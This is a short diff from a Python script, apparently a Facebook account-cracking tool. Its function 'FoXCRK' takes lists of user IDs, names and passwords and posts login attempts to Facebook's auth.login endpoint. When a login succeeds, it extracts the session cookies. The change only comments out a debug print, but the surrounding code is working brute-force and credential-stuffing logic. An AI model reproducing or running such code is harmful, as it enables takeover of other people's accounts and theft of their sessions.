@@ -220,7 +220,7 @@ def FoXCRK(ids,names,passlist):
             #print(head)
             po = requests.post('https://b-api.facebook.com/method/auth.login',data=data,headers=head,allow_redirects=False).text
             load = json.loads(po)
-            print(po)
+            #print(po)
             if 'session_key' in load:
                 kuki = ";".join(i["name"]+"="+i["value"] for i in load["session_cookies"])
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
